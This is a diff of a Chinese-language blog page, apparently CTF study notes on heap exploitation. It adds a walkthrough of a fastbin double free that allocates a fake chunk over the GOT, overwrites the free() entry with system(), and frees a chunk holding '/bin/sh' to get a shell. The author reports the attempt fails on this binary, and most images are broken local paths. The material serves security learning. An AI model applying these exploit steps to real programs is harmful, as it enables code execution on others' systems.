@@ -933,22 +933,81 @@
 
 
 
+<p>一个其它的小技巧，可以不用fake_chunk，而用stack的地址，也可以尝试修改got表。</p>
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/F92EEA34-1A35-4747-A2E1-D33B97F22E06.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/F92EEA34-1A35-4747-A2E1-D33B97F22E06.png" srcset="data:image/png;base64,666" alt="F92EEA34-1A35-4747-A2E1-D33B97F22E06" style="zoom:60%;">
 
 
 
+<p>如下显示使用got表。</p>
+<p>ida中查看got表的地址</p>
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/8F24425D-2900-497A-9311-696E765DF7AA.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/8F24425D-2900-497A-9311-696E765DF7AA.png" srcset="data:image/png;base64,666" alt="8F24425D-2900-497A-9311-696E765DF7AA" style="zoom:67%;">
 
 
 
+<p>![DC44B42C-DB70-46DF-9402-1562AB96E9A0](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/DC44B42C-DB70-46DF-9402-1562AB96E9A0.png)</p>
+<p>所以fake_chunk可以不用上面的那个，即我们自己找到了一个faku_chunk，大小为0x60。</p>
+<p>在申请的时候需要再申请的大小是0x58</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk2 = <span class="number">0x601ffa</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x58</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,p64(fake_chunk2))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
+<p>![3840DC5A-506C-4E7C-A9C1-F98C50460798](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/3840DC5A-506C-4E7C-A9C1-F98C50460798.png)</p>
+<p>再次add</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">6</span>,<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x58</span>)</span><br></pre></td></tr></table></figure>
+
+<p>![75C5E6EA-2D1A-4331-A6FA-72D496C097D1](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/75C5E6EA-2D1A-4331-A6FA-72D496C097D1.png)</p>
+<p>可以看出，在申请第8块的时候，申请到了got表的内容。可以往8号块写入内容。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">8</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这时报错，可能是因为got表错误，导致程序错误。</p>
+<p>不修改8个字节，修改3个字节尝试。</p>
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/98F4F230-CA17-4788-A5B7-02081AD36CB7.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/98F4F230-CA17-4788-A5B7-02081AD36CB7.png" srcset="data:image/png;base64,666" alt="98F4F230-CA17-4788-A5B7-02081AD36CB7" style="zoom:67%;">
+
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/0244529E-47AB-4CB1-BDE2-C1FA3630B67E.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/0244529E-47AB-4CB1-BDE2-C1FA3630B67E.png" srcset="data:image/png;base64,666" alt="0244529E-47AB-4CB1-BDE2-C1FA3630B67E" style="zoom:50%;">
 
 
 
+<p>查看上图发现，got表中有free()，我们可以把它改为system。payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">&#x27;a&#x27;</span>*<span class="number">14</span> + p64(system)</span><br><span class="line">edit(<span class="number">8</span>,len(py),py)</span><br></pre></td></tr></table></figure>
+
+<p>填入’a’报错，填入’\x00’，也报错。可能是改变了中间的有意义的值。</p>
+<p>![2BCB4DFF-4C62-475C-9DCB-370B4917F964](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/2BCB4DFF-4C62-475C-9DCB-370B4917F964.png)</p>
+<p>由于写是从0x60200a开始写到，先保持地址0x7ffff7ffe168不变。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mm = <span class="number">0x7ffff7ff</span></span><br><span class="line">py = p64(mm) + <span class="string">&#x27;a&#x27;</span>*<span class="number">6</span> + p64(system) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">8</span>,len(py),py)</span><br></pre></td></tr></table></figure>
+
+<p>![13BF0AFC-CFA5-45BF-821C-541976E2F50E](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/13BF0AFC-CFA5-45BF-821C-541976E2F50E.png)</p>
+<p>可以看到free被改成了system，并且保持了原来的一部分正确。</p>
+<p>但是！发现还是不可以的。</p>
+<p>下面保持原来下一个_dl_runtime_resolve_xsave也是不变的，即0x7ffff7deee40不变。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mm = <span class="number">0x7ffff7ff</span></span><br><span class="line"><span class="comment">#4byte</span></span><br><span class="line"></span><br><span class="line">dll = <span class="number">0x7ffff7deee40</span></span><br><span class="line"><span class="comment">#6byte</span></span><br><span class="line"></span><br><span class="line">py = <span class="string">&#x27;\xff\xf7\xff\x7f&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> +p64(dll) + p64(system) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">debug(<span class="number">0x400CCA</span>,<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">8</span>,len(py),py)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>![B095F4ED-6D72-4511-87A0-D63D2C332B9D](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/B095F4ED-6D72-4511-87A0-D63D2C332B9D.png)</p>
+<p>将1号块写入/bin/sh，然后free(1)</p>
+<p>断点设置在free处</p>
+<p>![8388EE4F-0497-4756-BF77-4DF4C0093FB4](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/8388EE4F-0497-4756-BF77-4DF4C0093FB4.png)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">8</span>,len(py),py)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">debug(<span class="number">0x400B94</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此时如果前面的都正确，然后去free一个有/bin/sh的堆块，就会getshell。</p>
+<p>但是还是报错了。</p>
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/88F09523-25FF-4C05-863A-708674CB2BA3.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/88F09523-25FF-4C05-863A-708674CB2BA3.png" srcset="data:image/png;base64,666" alt="88F09523-25FF-4C05-863A-708674CB2BA3" style="zoom:67%;">
 
 
 
+<p>思路就是这样，但是这道利用不了，掌握这个方法就ok。亦已焉哉～</p>
+<p>同样的思路，size的地址部分也有一个0xXX的值，用同样的方法利用。</p>
+<p>![D95D9E2B-B418-4DDA-A07E-EC1F8F51A4CE](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/D95D9E2B-B418-4DDA-A07E-EC1F8F51A4CE.png)</p>
+<p>![CFA2AC0B-77FA-4B43-8FDA-D40B5867037B](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/CFA2AC0B-77FA-4B43-8FDA-D40B5867037B.png)</p>
+<p>可以再申请一个堆块，大小为0x61，这里申请大小为0x61，存入的就是0x61,存入的值是没有加size头的。但是在再次申请的时候需要考虑size头。</p>
+<p>先把堆块的size构造入下</p>
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/97737D45-D431-456C-8B23-09CA89C25031.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/97737D45-D431-456C-8B23-09CA89C25031.png" srcset="data:image/png;base64,666" alt="97737D45-D431-456C-8B23-09CA89C25031" style="zoom:50%;">
 
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">8</span>,p64(fake_chunk2))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>![D8C756D5-CE33-4783-8DA9-FAC3842EAF1F](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/D8C756D5-CE33-4783-8DA9-FAC3842EAF1F.png)</p>
 <h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><h3 id="offbyone-and-offbynull"><a href="#offbyone-and-offbynull" class="headerlink" title="offbyone and offbynull"></a>offbyone and offbynull</h3><h3 id="tcache技术"><a href="#tcache技术" class="headerlink" title="tcache技术"></a>tcache技术</h3><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><p>地址 <a target="_blank" rel="noopener" href="https://github.com/Dittozzz/CISCN_2019_final_day1_pwn_6">https://github.com/Dittozzz/CISCN_2019_final_day1_pwn_6</a></p>
 <p>1、可以实现的功能：(1)free (2)malloc</p>
 <p>2、checksec </p>
@@ -1003,10 +1062,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-12-29T14:28:00+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-12-30T21:41:36+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Dec 29, 2020</p>
+    <p>更新于：Dec 30, 2020</p>
   </a>
 </div>
 
